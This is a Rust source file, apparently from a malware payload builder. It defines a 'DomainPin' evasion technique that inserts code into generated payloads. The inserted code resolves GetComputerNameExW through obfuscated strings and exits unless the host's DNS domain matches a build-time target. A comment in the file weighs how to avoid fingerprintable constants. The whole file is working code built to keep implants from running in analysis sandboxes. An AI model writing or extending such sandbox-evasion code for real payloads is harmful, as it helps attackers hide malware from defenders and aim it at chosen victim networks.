use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct DomainPin;

impl Technique for DomainPin {
    fn meta(&self) -> &'static TechniqueMeta { &DOMAIN_PIN_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        let expected = ctx.param("domain_pin", "domain").unwrap_or("");
        if expected.is_empty() {
            return Ok(());
        }

        // The expected domain still ends up as a plaintext string literal in
        // the payload; that is a build-time user input, not a fingerprintable
        // constant, so leave it as is.
        let snippet = format!(
r#"fn {{{{FN_EVASION_DOMAIN}}}}_get_name() -> Option<String> {{
    static OBF_MOD: &[u8] = &{{{{STR_KERNEL32}}}};
    static OBF_PROC: &[u8] = &{{{{STR_GET_COMPUTER_NAME_EX_W}}}};
    type Fn_ = unsafe extern "system" fn(i32, *mut u16, *mut u32) -> i32;
    unsafe {{
        let f: Fn_ = match {{{{FN_RESOLVER}}}}(OBF_MOD, OBF_PROC) {{
            Some(f) => f,
            None => return None,
        }};
        let mut size: u32 = 256;
        let mut buf: Vec<u16> = vec![0; size as usize];
        let ok = f(2 /* ComputerNameDnsDomain */, buf.as_mut_ptr(), &mut size);
        if ok == 0 || size == 0 {{ return None; }}
        buf.truncate(size as usize);
        String::from_utf16(&buf).ok().map(|s| s.trim_end_matches('\0').to_string())
    }}
}}
fn {{{{FN_EVASION_DOMAIN}}}}() {{
    match {{{{FN_EVASION_DOMAIN}}}}_get_name() {{
        Some(domain) => {{
            if !domain.as_str().eq_ignore_ascii_case("{0}") {{
                std::process::exit(0);
            }}
        }}
        None => {{ std::process::exit(0); }}
    }}
}}
{{{{FN_EVASION_DOMAIN}}}}();"#, expected);

        ctx.append_replacement("{{SANDBOX}}", snippet);
        Ok(())
    }
}

pub use super::super::DOMAIN_PIN_META;
